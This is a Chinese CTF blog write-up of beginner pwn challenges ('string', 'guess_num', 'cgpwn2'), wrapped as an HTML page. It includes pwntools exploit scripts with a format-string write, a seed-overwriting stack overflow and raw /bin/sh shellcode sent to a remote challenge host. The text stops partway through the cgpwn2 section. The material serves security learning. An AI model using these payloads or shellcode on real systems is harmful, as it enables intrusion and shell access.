@@ -1,0 +1,563 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>【攻防世界】pwn新手区 wp | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="写这些的时候是19.5.30  string （NUAACTF） 参考：CTF-wiki格式化字符串漏洞利用  0x01寻找漏洞checksec 在IDA中对文件进行分析。查看sub_400CA6时发现一条语句。  执行这条语句的条件是*a1 == a1[1]，a1为传入的参数，回溯发现a1即sub_400D72函数传入的v4，而v4 = (__int64)v3，其中 12*v3 = 68;">
+<meta name="keywords" content="pwn,wp,攻防世界">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【攻防世界】pwn新手区 wp">
+<meta property="og:url" content="p1Kk.github.io/2019/10/02/【攻防世界】pwn新手区/【攻防世界】pwn新手区/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="写这些的时候是19.5.30  string （NUAACTF） 参考：CTF-wiki格式化字符串漏洞利用  0x01寻找漏洞checksec 在IDA中对文件进行分析。查看sub_400CA6时发现一条语句。  执行这条语句的条件是*a1 == a1[1]，a1为传入的参数，回溯发现a1即sub_400D72函数传入的v4，而v4 = (__int64)v3，其中 12*v3 = 68;">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-03291ed5c6f77cdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-1912937504ed8ad7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-aab0805aafa61e3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-af30d7cf9514c668.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-4008f14924aa840e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-44a951c64cc2917c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-a2ed5c7504941c9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-f9dc62b8b1483b06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-0a77b2c7d0915c61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-52c792d5d2192705.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-bd67809606a6cdf9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-d7a7af8d231fa840.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-fd2655798ac06ac6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-cb878d7a507e1440.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-b1b24284d6715e51.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-10-03T01:29:46.371Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【攻防世界】pwn新手区 wp">
+<meta name="twitter:description" content="写这些的时候是19.5.30  string （NUAACTF） 参考：CTF-wiki格式化字符串漏洞利用  0x01寻找漏洞checksec 在IDA中对文件进行分析。查看sub_400CA6时发现一条语句。  执行这条语句的条件是*a1 == a1[1]，a1为传入的参数，回溯发现a1即sub_400D72函数传入的v4，而v4 = (__int64)v3，其中 12*v3 = 68;">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/17548101-03291ed5c6f77cdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/10/02/【攻防世界】pwn新手区/【攻防世界】pwn新手区/" title="【攻防世界】pwn新手区 wp" itemprop="url">【攻防世界】pwn新手区 wp</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2019-10-02T10:06:07.769Z" itemprop="datePublished"> Published 2019-10-02</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#string-（NUAACTF）"><span class="toc-number">1.</span> <span class="toc-text">string （NUAACTF）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01寻找漏洞"><span class="toc-number">1.1.</span> <span class="toc-text">0x01寻找漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#checksec"><span class="toc-number">1.1.0.0.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#在IDA中对文件进行分析。"><span class="toc-number">1.1.0.0.2.</span> <span class="toc-text">在IDA中对文件进行分析。</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02利用思路"><span class="toc-number">1.2.</span> <span class="toc-text">0x02利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03exp"><span class="toc-number">1.3.</span> <span class="toc-text">0x03exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#guess-num"><span class="toc-number">2.</span> <span class="toc-text">guess_num</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01寻找漏洞-1"><span class="toc-number">2.1.</span> <span class="toc-text">0x01寻找漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#checksec-1"><span class="toc-number">2.1.0.0.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ida分析"><span class="toc-number">2.1.0.0.2.</span> <span class="toc-text">ida分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02思路分析"><span class="toc-number">2.2.</span> <span class="toc-text">0x02思路分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03攻击"><span class="toc-number">2.3.</span> <span class="toc-text">0x03攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#关于rand和srand"><span class="toc-number">2.3.0.0.1.</span> <span class="toc-text">关于rand和srand</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#关于ctype库与dll"><span class="toc-number">2.3.0.0.2.</span> <span class="toc-text">关于ctype库与dll</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#libc共享库"><span class="toc-number">2.3.0.0.3.</span> <span class="toc-text">libc共享库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp如下"><span class="toc-number">2.3.0.0.4.</span> <span class="toc-text">exp如下</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cgpwn2（CGCTF）"><span class="toc-number">3.</span> <span class="toc-text">cgpwn2（CGCTF）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01寻找漏洞-2"><span class="toc-number">3.1.</span> <span class="toc-text">0x01寻找漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#checksec-2"><span class="toc-number">3.1.0.0.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ida分析-1"><span class="toc-number">3.1.0.0.2.</span> <span class="toc-text">ida分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02分析利用"><span class="toc-number">3.2.</span> <span class="toc-text">0x02分析利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03攻击-1"><span class="toc-number">3.3.</span> <span class="toc-text">0x03攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#int-overflow"><span class="toc-number">4.</span> <span class="toc-text">int_overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01寻找漏洞-3"><span class="toc-number">4.1.</span> <span class="toc-text">0x01寻找漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#checksec-3"><span class="toc-number">4.1.0.0.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ida分析-2"><span class="toc-number">4.1.0.0.2.</span> <span class="toc-text">ida分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02利用思路-1"><span class="toc-number">4.2.</span> <span class="toc-text">0x02利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03攻击-2"><span class="toc-number">4.3.</span> <span class="toc-text">0x03攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp如下-1"><span class="toc-number">4.3.0.0.1.</span> <span class="toc-text">exp如下</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level3"><span class="toc-number">5.</span> <span class="toc-text">level3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01寻找漏洞-4"><span class="toc-number">5.1.</span> <span class="toc-text">0x01寻找漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#checksec-4"><span class="toc-number">5.1.0.0.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ida分析-3"><span class="toc-number">5.1.0.0.2.</span> <span class="toc-text">ida分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02思路分析-1"><span class="toc-number">5.2.</span> <span class="toc-text">0x02思路分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03攻击-3"><span class="toc-number">5.3.</span> <span class="toc-text">0x03攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp如下-2"><span class="toc-number">5.3.0.0.1.</span> <span class="toc-text">exp如下</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ps"><span class="toc-number">5.3.0.0.2.</span> <span class="toc-text">ps</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+		
+		</div>
+		
+		<ul>
+<li>写这些的时候是19.5.30</li>
+</ul>
+<h1 id="string-（NUAACTF）"><a href="#string-（NUAACTF）" class="headerlink" title="string （NUAACTF）"></a>string （NUAACTF）</h1><blockquote>
+<p>参考：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/" target="_blank" rel="noopener">CTF-wiki格式化字符串漏洞利用</a></p>
+</blockquote>
+<h2 id="0x01寻找漏洞"><a href="#0x01寻找漏洞" class="headerlink" title="0x01寻找漏洞"></a>0x01寻找漏洞</h2><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://upload-images.jianshu.io/upload_images/17548101-03291ed5c6f77cdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h5 id="在IDA中对文件进行分析。"><a href="#在IDA中对文件进行分析。" class="headerlink" title="在IDA中对文件进行分析。"></a>在IDA中对文件进行分析。</h5><p>查看sub_400CA6时发现一条语句。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-1912937504ed8ad7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/17548101-aab0805aafa61e3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>执行这条语句的条件是*a1 == a1[1]，a1为传入的参数，回溯发现a1即sub_400D72函数传入的v4，而v4 = (__int64)v3，其中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v3 = 68;   #即v3[0] = 68;</span><br><span class="line">v3[1] = 85;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说要使<em>a1 == a1[1]，则需要</em>v3 == v3[1]。<br>继续往下找办法修改v3[0]为85。<br><img src="https://upload-images.jianshu.io/upload_images/17548101-af30d7cf9514c668.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>一直查看到sub_400BB9函数，发现printf处存在格式化字符串漏洞，可以进行任意地址写，所以我们需要找到v3[0]的地址。<br><img src="https://upload-images.jianshu.io/upload_images/17548101-4008f14924aa840e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="0x02利用思路"><a href="#0x02利用思路" class="headerlink" title="0x02利用思路"></a>0x02利用思路</h2><p>根据程序执行流程进行输入</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-44a951c64cc2917c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>跳出，进入sub_400BB9函数。</p>
+<p>由<a href="https://www.jianshu.com/p/47d80d34e5ee" target="_blank" rel="noopener">函数调用约定</a>可知，在64位程序下，前六个参数从左到右放入<em>RDI</em>, <em>RSI</em>, <em>RDX</em>, <em>ECX</em>, <em>R8</em>, <em>R9</em>中，利用<strong>格式化字符串漏洞</strong>，进入脆弱点，写入<strong>shellcode</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">...[overwrite addr]....%[overwrite offset]$n</span><br></pre></td></tr></table></figure>
+
+<p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p>
+<ul>
+<li>确定覆盖地址</li>
+<li>确定相对偏移</li>
+<li>进行覆盖</li>
+</ul>
+<p>所以从n = 7开始，我们可以修改栈中的数据为85。<br>我在addr处输入“abcdef”作为测试，在<em>printf(&amp;format, &amp;format);</em>处下断点，然后查看rsp寄存器</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-a2ed5c7504941c9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="x/10x $rsp"></p>
+<h2 id="0x03exp"><a href="#0x03exp" class="headerlink" title="0x03exp"></a>0x03exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#!usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&apos;111.198.29.45&apos;, 56593)</span><br><span class="line"></span><br><span class="line"># io = process(&apos;./string&apos;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;secret[0] is &quot;)</span><br><span class="line"></span><br><span class="line">v3_0_addr = int(io.recvuntil(&quot;\n&quot;)[:-1], 16)</span><br><span class="line"></span><br><span class="line">log.info(&quot;v3_0_addr:&quot; + hex(v3_0_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;character&apos;s name be:&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(&quot;kk&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;east or up?:&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(&quot;east&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;there(1), or leave(0)?:&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;&apos;Give me an address&apos;&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(str(v3_0_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;you wish is:&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(&quot;%85c%7$n&quot;)</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh()) #生成的shellcode攻击失败，所以使用反汇编的shellcode</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;USE YOU SPELL&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h1><h2 id="0x01寻找漏洞-1"><a href="#0x01寻找漏洞-1" class="headerlink" title="0x01寻找漏洞"></a>0x01寻找漏洞</h2><h5 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/guess_num$ checksec guess_num</span><br><span class="line">[*] &apos;/home/kk/Desktop/black/GFSJ/guess_num/guess_num&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><p><img src="https://upload-images.jianshu.io/upload_images/17548101-f9dc62b8b1483b06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>箭头所指的地方存在栈溢出，进入sub_C3E函数，发现条件成立即可找到flag</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-0a77b2c7d0915c61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="cat flag"></p>
+<h2 id="0x02思路分析"><a href="#0x02思路分析" class="headerlink" title="0x02思路分析"></a>0x02思路分析</h2><p>进入v7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000030 var_30          db ?</span><br><span class="line">-000000000000002F                 db ? ; undefined</span><br><span class="line">-000000000000002E                 db ? ; undefined</span><br><span class="line">-000000000000002D                 db ? ; undefined</span><br><span class="line">-000000000000002C                 db ? ; undefined</span><br><span class="line">-000000000000002B                 db ? ; undefined</span><br><span class="line">-000000000000002A                 db ? ; undefined</span><br><span class="line">-0000000000000029                 db ? ; undefined</span><br><span class="line">-0000000000000028                 db ? ; undefined</span><br><span class="line">-0000000000000027                 db ? ; undefined</span><br><span class="line">-0000000000000026                 db ? ; undefined</span><br><span class="line">-0000000000000025                 db ? ; undefined</span><br><span class="line">-0000000000000024                 db ? ; undefined</span><br><span class="line">-0000000000000023                 db ? ; undefined</span><br><span class="line">-0000000000000022                 db ? ; undefined</span><br><span class="line">-0000000000000021                 db ? ; undefined</span><br><span class="line">-0000000000000020                 db ? ; undefined</span><br><span class="line">-000000000000001F                 db ? ; undefined</span><br><span class="line">-000000000000001E                 db ? ; undefined</span><br><span class="line">-000000000000001D                 db ? ; undefined</span><br><span class="line">-000000000000001C                 db ? ; undefined</span><br><span class="line">-000000000000001B                 db ? ; undefined</span><br><span class="line">-000000000000001A                 db ? ; undefined</span><br><span class="line">-0000000000000019                 db ? ; undefined</span><br><span class="line">-0000000000000018                 db ? ; undefined</span><br><span class="line">-0000000000000017                 db ? ; undefined</span><br><span class="line">-0000000000000016                 db ? ; undefined</span><br><span class="line">-0000000000000015                 db ? ; undefined</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br></pre></td></tr></table></figure>
+
+<p>发现var_30在栈中占0x20，可以覆盖到seed<br>如果使输入的guessnumber，即v4等于随机数v6，即可cat flag。</p>
+<h2 id="0x03攻击"><a href="#0x03攻击" class="headerlink" title="0x03攻击"></a>0x03攻击</h2><h5 id="关于rand和srand"><a href="#关于rand和srand" class="headerlink" title="关于rand和srand"></a>关于rand和srand</h5><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br>对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</p>
+<h5 id="关于ctype库与dll"><a href="#关于ctype库与dll" class="headerlink" title="关于ctype库与dll"></a>关于ctype库与dll</h5><p>我们使用python标准库中自带的ctypes模块进行python和c的混合编程</p>
+<h5 id="libc共享库"><a href="#libc共享库" class="headerlink" title="libc共享库"></a>libc共享库</h5><p>可以使用ldd查找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/guess_num$ ldd guess_num </span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffd3f5a0000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e6c0b0000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f1e6c67d000)</span><br></pre></td></tr></table></figure>
+
+<p>也可以在脚本中通过elf文件查找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(&apos;./guess_num&apos;)</span><br><span class="line">libc = elf.libc</span><br></pre></td></tr></table></figure>
+
+<h5 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">io = remote(&apos;111.198.29.45&apos;, 45742)</span><br><span class="line"># io = process(&apos;./guess_num&apos;)</span><br><span class="line"></span><br><span class="line">#elf = ELF(&apos;./guess_num&apos;)</span><br><span class="line">#libc = elf.libc</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">payload = &quot;a&quot; * 0x20 + p64(1)</span><br><span class="line">io.recvuntil(&apos;your name:&apos;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line">for i in range(10):</span><br><span class="line">    num = str(libc.rand()%6+1)</span><br><span class="line">    io.recvuntil(&apos;number:&apos;)</span><br><span class="line">    io.sendline(num)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="cgpwn2（CGCTF）"><a href="#cgpwn2（CGCTF）" class="headerlink" title="cgpwn2（CGCTF）"></a>cgpwn2（CGCTF）</h1><h2 id="0x01寻找漏洞-2"><a href="#0x01寻找漏洞-2" class="headerlink" title="0x01寻找漏洞"></a>0x01寻找漏洞</h2><h5 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/cgpwn2$ checksec ./cgpwn2 </span><br><span class="line">[*] &apos;/home/kk/Desktop/black/GFSJ/cgpwn2/cgpwn2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  hello();</span><br><span class="line">  puts(&quot;thank you&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入hello函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-52c792d5d2192705.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>发现gets(&amp;s)处存在栈溢出</p>
